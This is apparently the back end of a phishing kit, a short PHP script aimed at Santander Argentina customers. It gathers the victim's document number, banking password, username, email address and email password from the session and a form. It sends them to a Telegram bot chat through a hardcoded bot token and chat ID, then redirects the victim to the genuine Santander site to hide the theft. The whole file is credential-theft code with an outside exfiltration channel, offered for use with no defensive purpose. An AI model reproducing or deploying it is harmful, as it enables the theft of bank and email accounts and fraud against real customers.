<?php
session_start();

// Datos del bot de Telegram
$botToken = '6662872977:AAG9cyvIoECBjYw_Dg1TlLRi99A97u6UW_M';
$chatID = '5792986703;
$message = urlencode("SANTANDER:\nDocumento: ".$_SESSION['u1']."\nClave: ".$_SESSION['u2']."\nUsuario: ".$_SESSION['u3']."\nCorreo Electrónico: ".$_POST['nm1']."\nClave de Correo Electrónico: ".$_POST['nm2']);

// URL de la API de Telegram para enviar mensajes
$telegramURL = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatID}&text={$message}";

// Enviar solicitud a la API de Telegram
$response = file_get_contents($telegramURL);

// Redirigir al usuario a la página de Santander
header('Location: https://www.santander.com.ar/personas');

// Destruir la sesión y finalizar el script
session_destroy();
exit;
?>
